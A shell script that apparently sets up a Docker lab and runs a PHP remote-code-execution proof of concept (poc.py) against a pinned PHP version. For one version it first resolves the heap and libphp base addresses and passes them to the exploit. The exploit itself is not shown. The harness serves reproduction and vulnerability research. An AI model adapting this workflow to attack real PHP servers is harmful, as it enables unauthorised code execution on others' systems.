#!/bin/sh
set -eu

repo_dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$repo_dir"

. "$repo_dir/versions.sh"
select_php_version "${1:-8.4.26}"

compose() {
    docker compose --project-name php-rce-run --file compose.yaml "$@"
}

cleanup() {
    compose down --volumes --remove-orphans >/dev/null 2>&1 || true
}

trap cleanup EXIT HUP INT TERM

printf '%s\n' "[1/4] Pulling the pinned PHP $PHP_LAB_VERSION and Python images"
compose pull

printf '%s\n' "[2/4] Starting PHP $PHP_LAB_VERSION with the default lab page"
compose up --detach --wait --force-recreate target

actual_version=$(compose exec -T target php -r 'echo PHP_VERSION;')
if [ "$actual_version" != "$PHP_LAB_VERSION" ]; then
    printf '%s\n' \
        "ERROR: expected PHP $PHP_LAB_VERSION, received: $actual_version" >&2
    exit 1
fi

page=$(compose exec -T target php -r \
    'echo file_get_contents("http://127.0.0.1/index.php");')
if [ "$page" != "php-lab" ]; then
    printf '%s\n' "ERROR: expected php-lab, received: $page" >&2
    exit 1
fi
printf '%s\n' "[3/4] Default page verified over HTTP: $page"

# The smoke request touched the single Apache worker. Restart it so the PoC
# begins with a clean process and deterministic heap state.
compose restart target >/dev/null
compose up --detach --wait target

printf '%s\n' '[4/4] Running the fixed local command-execution proof'
if [ "$PHP_LAB_VERSION" = "8.2.34" ]; then
    container=$(compose ps --quiet target)
    bases=$(python3 ./poc.py \
        --profile "$PHP_LAB_VERSION" \
        --print-docker-bases "$container")
    # The helper emits exactly two validated hexadecimal addresses.
    set -- $bases
    if [ "$#" -ne 2 ]; then
        printf '%s\n' 'ERROR: failed to resolve the two Docker addresses' >&2
        exit 1
    fi
    compose run --rm runner \
        python3 /app/poc.py target:80 \
        --profile "$PHP_LAB_VERSION" \
        --heap-base "$1" \
        --libphp-base "$2"
else
    compose run --rm runner \
        python3 /app/poc.py target:80 --profile "$PHP_LAB_VERSION"
fi
